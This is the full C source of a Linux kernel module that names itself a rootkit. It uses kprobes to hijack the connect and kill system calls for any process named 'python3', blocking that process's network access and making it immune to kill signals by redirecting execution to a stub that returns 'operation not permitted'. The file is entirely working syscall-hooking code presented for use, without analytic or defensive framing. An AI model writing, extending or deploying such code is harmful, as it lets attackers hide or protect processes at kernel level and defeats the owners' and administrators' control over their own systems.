#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// The name of the process we want to quarantine
#define TARGET_PROCESS "python3"

// STUB: Bypass function to return "Operation Not Permitted"
// Like kprobe_blocker
asmlinkage long my_stub_function(void) {
    return -EPERM;
}

// HOOK 1: Block Network Connections (sys_connect)
static int handler_connect(struct kprobe *p, struct pt_regs *regs)
{
    // Check if the current process name matches our target
    if (strstr(current->comm, TARGET_PROCESS)) {
        printk(KERN_ALERT "rootkit: Blocked network for %s (PID: %d)\n", 
               current->comm, current->pid);
        
        // HIJACK: Redirect to our stub function
        regs->ip = (unsigned long)my_stub_function;
        return 1; // Skip original instruction
    }
    return 0;
}

// HOOK 2: Prevent Termination (sys_kill)
static int handler_kill(struct kprobe *p, struct pt_regs *regs)
{
    // sys_kill(pid_t pid, int sig)
    // RDI = pid, RSI = sig
    pid_t target_pid = regs->di;

    // We need to look up the task struct of the target PID
    struct pid *pid_struct = find_get_pid(target_pid);
    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);

    if (task && strstr(task->comm, TARGET_PROCESS)) {
        printk(KERN_ALERT "rootkit: Prevented kill signal to %s\n", task->comm);
        
        // HIJACK: Redirect to stub
        regs->ip = (unsigned long)my_stub_function;
        return 1;
    }
    return 0;
}

static struct kprobe kp_connect = {
    .symbol_name = "__x64_sys_connect",
    .pre_handler = handler_connect,
};

static struct kprobe kp_kill = {
    .symbol_name = "__x64_sys_kill",
    .pre_handler = handler_kill,
};

static int __init rk_init(void) {
    register_kprobe(&kp_connect);
    register_kprobe(&kp_kill);
    printk(KERN_INFO "rootkit: Quarantine Active on '%s'\n", TARGET_PROCESS);
    return 0;
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp_connect);
    unregister_kprobe(&kp_kill);
}

module_init(rk_init);
module_exit(rk_exit);
